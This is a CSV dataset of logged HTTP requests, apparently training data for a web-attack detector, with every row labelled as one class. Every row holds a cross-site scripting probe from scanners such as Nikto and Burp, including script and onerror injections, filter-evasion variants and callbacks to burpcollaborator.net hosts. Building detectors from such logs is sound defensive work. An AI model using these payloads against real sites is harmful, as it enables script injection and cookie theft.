id,method,user_agent,url,refer,body,lable
2786,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-admin/admin.php?page=ultimate-maps-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
2763,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/visualrf/group_list.xml?aps=1&start=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&end=500&match,,,5
30,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/g2j0iuxmc2mawq3tnoypv3rpagg9404owfkc72vrX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/order_b2d2-5543066de5b78ab6.pdf,http://121.4.111.58:3000/ftp,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/g2j0iuxmc2mawq3tnoypv3rpagg9404owfkc72vrX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/order_b2d2-5543066de5b78ab6.pdf HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
3983,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),"/extman/cgi/changepwd.cgi?__mode=504%20onerror=""alert(504);&username=",,,5
269,GET,python-requests/2.18.4,/Activity/edit?id=16?title=%E7%AB%9E%E7%8C%9C%E6%AC%A7%E6%B4%B2%E6%9D%AF&end_time=2016-08-12+00%3A00%3A00&image=88888&url=http://www.hacker.org/&is_popup=0&detail=%3Cp%3E%E4%B8%BA%E4%BA%86%E8%BF%8E%E5%90%88%E6%AC%A7%E6%B4%B2%E6%9D%AF%E7%83%AD%E4%BA%8B%EF%BC%8C%E7%AD%96%E5%88%92%E3%80%90%E7%AB%9E%E7%8C%9C%E6%AC%A7%E6%B4%B2%E6%9D%AF%E3%80%91%E6%B4%BB%E5%8A%A8%EF%BC%8C%E8%BE%9B%E8%8B%A6%E5%90%84%E4%BD%8D%E8%AF%84%E5%AE%A1%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%8E%92%E6%9C%9F%E3%80%82%E6%AD%A4%E6%B4%BB%E5%8A%A8%E4%BC%98%E5%85%88%E7%BA%A7%E6%AF%94%E8%BE%83%E9%AB%98%EF%BC%8C%E5%85%B7%E4%BD%93%E9%9C%80%E6%B1%82%E5%A6%82%E4%B8%8B%EF%BC%9A%3C%2Fp%3E%3Cp%3E%26nbsp%3B+%26nbsp%3B%3C%2Fp%3E%3Cp%3E%26nbsp%3B%26nbsp%3B%26nbsp%3B%E9%A2%84%E8%AE%A1%E4%B8%8A%E7%BA%BF%E6%97%B6%E9%97%B4%EF%BC%9A6.29+12%3A00-7.12+24%3A00%3C%2Fp%3E%3Cp%3E%26nbsp%3B+%26nbsp%3B%E6%B4%BB%E5%8A%A8%E7%9B%AE%E7%9A%84%EF%BC%9A%E6%8B%89%E6%94%B6%2B%E9%85%8D%E5%90%88%E6%AC%A7%E6%B4%B2%E6%9D%AF%E8%B5%9B%E7%A8%8B%E7%83%AD%E7%82%B9%E4%BA%8B%3C%2Fp%3E%3Cp%3E%26nbsp%3B+%26nbsp%3B%E6&start_time=2016-06-27+00%3A00%3A00%3Cscript%3Ealert(42873)%3C/script%3E,,,5
1778,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/c0zrmfzc.dll?<script>cross_site_scripting.nasl</script>,,,5
142,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/77cplrv5ze5pecryf2lbte02atgn4lsdj1go6cvX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/package.json.bak,http://121.4.111.58:3000/ftp/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/77cplrv5ze5pecryf2lbte02atgn4lsdj1go6cvX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/package.json.bak HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
765,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/yj/yj/zz/2016/shdt/2021/""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%38%33%30%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E",http://114.251.10.253/,"GET /yj/yj/zz/2016/shdt/2021/""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%38%33%30%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
1216,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/uNBVQ%3CuNBVQ%3EuNBVQ%27uNBVQ%22uNBVQ/uNBVQ-uNBVQ?hl=%3C%2FbODy%3E%3CiMg+id%3D%27wjIpowHG%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdY%3E&pref=%3C%2FboDY%3E%3CiMG+id%3D%27wQigZduo%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBody%3E&pval=%3C%2FBodY%3E%3CimG+id%3D%27JFLYAxAT%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbOdY%3E&q=%3C%2FBoDy%3E%3CIMG+id%3D%27IuryCLfe%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbODy%3E&sa=%3C%2FbODy%3E%3CIMG+id%3D%27sKwFimUB%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbOdY%3E&usg=%3C%2FBoDy%3E%3CIMG+id%3D%27CLZKdLno%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDy%3E&ust=%3C%2FBODy%3E%3CIMg+id%3D%27kzAKhhqa%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbOdy%3E,,,5
179,GET,python-requests/2.18.4,/Activity/edit?start_time=2016-07-05+00%3A00%3A00&end_time=2016-12-31+00%3A00%3A00&image=88888&url=http://www.hacker.org/&sequence=0&detail=%3Cp%3E%E6%A0%B9%E6%8D%AE%E4%BA%A7%E5%93%81%E9%9C%80%E6%B1%82%EF%BC%8C%E2%80%9C%E4%B8%BB%E6%92%AD%E8%AF%84%E7%BA%A7%E7%94%B3%E8%AF%B7%E2%80%9D%E7%9A%84%E9%9C%80%E6%B1%82%E6%9C%89%E4%B8%AA%E5%B0%8F%E8%B0%83%E6%95%B4%EF%BC%9A%3C%2Fp%3E%3Cp%3E1.+%E7%94%B3%E8%AF%B7%E6%B5%81%E7%A8%8B%E8%B0%83%E6%95%B4%EF%BC%9A%E4%B9%8B%E5%89%8D%E5%85%88%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%E5%86%8D%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%EF%BC%8C%E6%94%B9%E4%B8%BA%E5%85%88%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%E5%86%8D%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%EF%BC%882%E4%B8%AA%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92%E4%B8%8B%EF%BC%89%E3%80%82%3C%2Fp%3E%3Cp%3E2.+%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%9A%E7%94%A8%E6%88%B7%E6%AF%8F%E5%AE%8C%E6%88%901%E4%B8%AA%E7%94%B3%E8%25&id=1&is_popup=0%3Cscript%3Ealert(42873)%3C/script%3E,,,5
3810,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003035),"/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\""><script>alert('Vulnerable')</script>,/system/status/session",,;,5
2,GET,python-requests/2.18.4,/Activity/edit?id=31?title=%E6%98%8E%E6%98%9F%E6%9D%A5%E4%BA%86&start_time=2016-08-04+00%3A00%3A00&image=88888&url=http://www.hacker.org/&detail=%3Cp%3E%40%E7%94%9F%E7%82%AC%26nbsp%3B%40%E6%95%AC%E5%AE%89%3C%2Fp%3E%3Cp%3E%3Cb%3E%E6%8A%80%E6%9C%AF%E9%9C%80%E6%B1%82%EF%BC%9A%3C%2Fb%3E%3C%2Fp%3E%3Cp%3E1%E3%80%81%26nbsp%3B%E7%82%B9%E5%87%BB%E5%A4%B4%E5%83%8F%E6%A1%86%E8%B7%B3%E8%BD%AC%E5%88%B0%E4%B8%AA%E4%BA%BA%E4%B8%BB%E9%A1%B5%3C%2Fp%3E%3Cp%3E2%E3%80%81%26nbsp%3B%E5%85%B3%E6%B3%A8%E4%B8%BB%E6%92%AD%3C%2Fp%3E%3Cp%3E3%E3%80%81%26nbsp%3B%E5%81%9A%E6%88%90%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%EF%BC%8C8%E6%9C%88%E4%BB%BD%E6%AF%8F%E4%B8%A4%E5%A4%A9%E6%9B%B4%E6%96%B0%E4%B8%80%E6%AC%A1%3C%2Fp%3E%3Cp%3E4%E3%80%81%26nbsp%3B%E5%88%86%E4%BA%AB%E6%96%87%E6%A1%88%EF%BC%9A%E6%98%8E%E6%98%9F%E6%9D%A5%E4%BA%86%EF%BC%8C%E4%BD%A0%E5%87%86%E5%A4%87%E5%A5%BD%E4%BA%86%E5%90%97%3C%2Fp%3E%3Cp%3E%E5%88%86%E4%BA%AB%E6%A0%87%E9%A2%98%EF%BC%9A%E4%B8%8A%E8%8A%B1%E6%A4%92%E7%9C%8B%E6%98%8E%E6%98%9F%E4%B8%8E%E6%9A%91%E5%81%87%E6%9B%B4%E9%85%8D%E5&end_time=88888&is_popup=0%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
1236,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/statics/js'""()&%25<acx><ScRiPt%20>ACQh(9840)<%2fScRiPt>/cookie.js",http://10.216.194.122:9002/,,5
2777,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/webadmin/pkg?command=<script>alert(document.cookie)</script>,,,5
3665,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/item.fts?href=%22%3E%3Cscript%3Ealert(%22ftgate_44002.nasl%22)%3C%2Fscript%3E%3B,,,5
4134,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/duplicator/files/installer.cleanup.php?remove=1&package=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
14,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/gyi0eutm82iasqztjoupr3np6gc90co4fs6ktahzX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/gyi0eutm82iasqztjoupr3np6gc90co4fs6ktahzX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
2235,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?__mode=step2&cancel=Cancel&cancel=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28205%29%3E&save=Submit&username=,,,5
292,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/ivhsuucu2jyy8g50ix7zecymmds6gxel6cu9h05pX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_macos_64.url,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/ivhsuucu2jyy8g50ix7zecymmds6gxel6cu9h05pX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_macos_64.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
290,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/7pxhoj6jw8sn25zpcm1o81sbg2mvamaa21qydo1dX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/quarantine/juicy_malware_windows_64.exe.url,http://121.4.111.58:3000/ftp/quarantine,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/7pxhoj6jw8sn25zpcm1o81sbg2mvamaa21qydo1dX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/quarantine/juicy_malware_windows_64.exe.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
46,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/package.json.bak?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fo1q8h2wubalivy21mwxxubqx9ofi3fr7ivci26rX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/,"GET /ftp/package.json.bak?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fo1q8h2wubalivy21mwxxubqx9ofi3fr7ivci26rX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
4046,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Zerolab-W/v2.0.6",/cgi-bin/jc.cgi?_dc=%3C%2Fscript%3E%3Cscript%3Ewindow.top._gxWebscan_taint_tracer.log_execution_flow_sink%28%29%3C%2Fscript%3E&t=js&f=jquery-1.10.2.min.js,,,5
9,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/manager/loginController.htm?stroperatorname=fOpa1F5d&strinput=&strbase64=&csrftoken=08b7-086e2b2f181da6ccc04&act=login&act=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28205%29%3E,,,5
139,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/j8s1m3wh0q61fosagemnuq1eb5h05r2fu6ixak08pX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/j8s1m3wh0q61fosagemnuq1eb5h05r2fu6ixak08pX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
15,GET,python-requests/2.18.4,/index.php?src=gaia_app_result_history&gaia_app=1&c=waterfall&srcg=gaia_app&version=1.0.0.2003&category=internal&userid=3fb5c5221b70b5bf08079ca91ab90736&channel=SHOUZHU&ls=SHOUZHU?&a=index&q=%E4%B8%AD%E5%B0%8F%E6%9D%BF%E6%8C%87%E6%95%B0+&src=gaia_app_result_history&gaia_app=1&c=waterfall&srcg=gaia_app&version=1.0.0.2003&category=internal&userid=3fb5c5221b70b5bf08079ca91ab90736&channel=SHOUZHU&ls=SHOUZHU&q=%E4%B8%AD%E5%B0%8F%E6%9D%BF%E6%8C%87%E6%95%B0+%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
728,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/new/style'""()&%25<acx><ScRiPt%20>igjy(9009)<%2fScRiPt>/guobie.css",http://114.251.10.253/,"GET /v3/new/style'""()&%25<acx><ScRiPt%20>igjy(9009)<%2fScRiPt>/guobie.css HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  GET /v3/new/style9670878/guobie.css HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
1361,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000733),"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>",,"<!--#include virtual=""/index.jsp""-->",5
2248,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/tinybrowser/upload.php?goodfiles=1><script>alert('tinybrowser_multiple_xss')</script>,,,5
730,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/css'""()&%25<acx><ScRiPt%20>IOTF(9188)<%2fScRiPt>/font-awesome.min.css",http://114.251.10.253/,"GET /v3/css'""()&%25<acx><ScRiPt%20>IOTF(9188)<%2fScRiPt>/font-awesome.min.css HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
3786,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/manager/loginController.htm?stroperatorname=&strinput=&strbase64=463790&csrftoken=f0e7-7938c59a181e00a2986-&act=login&act=><scr<script>ipt>alert(217)</scr</script>ipt>,,,5
3643,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/overview.cgi?__mode=overview_manager&__mode=><scr<script>ipt>alert(217)</scr</script>ipt>,,,5
2807,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search,,,5
1266,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Zerolab-W/v2.0.6",/cgi-bin/loginTheme/theme1/login.js?1551998060=%3C%2Fscript%3E%3Cscript%3Ewindow.top._gxWebscan_taint_tracer.log_execution_flow_sink%28%29%3C%2Fscript%3E,,,5
428,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/e8nwmywc0l6wfjs5g9miul19b0ht5k981zpwcm0bX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/?EIO=4&transport=polling&t=N-B7OGR&sid=wpknSgOSW-C_eFRsAAYe,http://121.4.111.58:3000/,"POST /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/e8nwmywc0l6wfjs5g9miul19b0ht5k981zpwcm0bX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/?EIO=4&transport=polling&t=N-B7OGR&sid=wpknSgOSW-C_eFRsAAYe HTTP/1.1 Host: 121.4.111.58:3000 Content-Length: 2 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Content-type: text/plain;charset=UTF-8 Origin: http://121.4.111.58:3000 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  40",5
767,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/js'""()&%25<acx><ScRiPt%20>gg1y(9644)<%2fScRiPt>/scroll/smoothscroll.js",http://114.251.10.253/,"GET /v3/js'""()&%25<acx><ScRiPt%20>gg1y(9644)<%2fScRiPt>/scroll/smoothscroll.js HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
